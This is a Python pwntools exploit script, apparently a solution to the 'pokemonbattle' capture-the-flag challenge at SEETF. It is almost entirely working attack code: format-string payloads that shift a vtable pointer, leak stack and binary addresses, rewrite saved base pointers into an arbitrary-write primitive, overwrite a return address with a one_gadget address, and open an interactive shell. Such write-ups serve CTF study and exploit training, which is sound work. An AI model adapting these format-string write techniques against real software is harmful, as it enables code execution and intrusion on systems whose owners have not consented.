#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=fun.chall.seetf.sg' '--port=50005' pokemonbattle
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pokemonbattle')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'fun.chall.seetf.sg'
port = int(args.PORT or 50005)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

# Move the vtable 8 byte forward to redirect calls
# from Battle() to Play() and get infinite format
# string vulnerabilities

# 0x68+8 = 112
# %7$p prints a pointer to battler
io.sendlineafter(b"pokemon:", b"%112x%7$hhn")

# Leak battler's address
io.sendlineafter(b"pokemon:", b"%7$p")
leak = int(io.recvline().split()[0].replace(b",", b""), 16)
log.info(f"vtable pointer: {hex(leak)}")

# Leak the saved base pointer
io.sendlineafter(b"pokemon:", b"%8$p")
leak_bp = int(io.recvline().split()[0].replace(b",", b""), 16)
log.info(f"saved base pointer: {hex(leak_bp)}")

# Take the first byte of the base pointer,
# this will be address that will contain the 
# target of our arbitrary write primitive
bp_base = leak_bp & 0xff

# Our target is the return address of the latest Play()
# call. The location of this was computed looking at the GDB state. 
# There is no calculation or some fancy shit, this was just me
# staring at GDB at three o'clock in the morning.
target = leak_bp - 344 + 32

# Since the Play() frame size is predictable and of the same
# size, we can use this info to rewrite the first byte of 
# saved base pointers with bp_base + {0x2,0x4,0x6}. 
# This allows us to have 4 pointers to our target and allows us 
# to rewrite completely the target address.

# saved_base_pointer + 0x6 (0x9999999999998070)
# ret address
# ...
# saved_base_pointer + 0x4 (0x9999999980706050)
# ret addr
# ...
# saved_base pointer + 0x2 (0x9999807060504030)
# ret addr
# ...
# saved base pointer (ptr to 0x8070605040302010)
# ret address
# ...
# target (0x8070605040302010)

# Using the 4 pointers we can overwrite target and then
# use target as the address of a later format string attack 

# Little check: if 0 don't use %0x%12$hhn, since it does
# not work lol
if bp_base == 0:
    io.sendlineafter(b"pokemon:", b"%12$hhn")
else:
   io.sendlineafter(b"pokemon:", b"%"+str(bp_base).encode()+b"x%12$hhn")

io.sendlineafter(b"pokemon:", b"%"+str(bp_base+2).encode()+b"x%12$hhn")
io.sendlineafter(b"pokemon:", b"%"+str(bp_base+4).encode()+b"x%12$hhn")
io.sendlineafter(b"pokemon:", b"%"+str(bp_base+6).encode()+b"x%12$hhn")

log.info(f"target: {hex(target)}")

# Little hack to write two byte at a time
for i in range(0, 8*8, 16):
    prepend = b"" 
    if (target>>i & 0xffff) != 0:
        prepend = b"%"+str(target>>i & 0xffff).encode()+b"x"

    io.sendlineafter(b"pokemon:", prepend+b"%32$n")

# Use one_gadget + 5, since there is a movaps issue
win = (leak - 0x2e92 + 5) & 0xff

log.info(f"win byte: {hex(win)}")

# Rewrite the first byte of target with the first of win,
# since they are in the same page.
io.sendlineafter(b"pokemon:", b"%"+str(win).encode()+b"x%48$hhn")

# Move back the vtable to the original place, to trigger the
# return address we just wrote.
io.sendlineafter(b"pokemon:", b"%104x%7$hhn")

# G0t fl4g?
io.interactive()
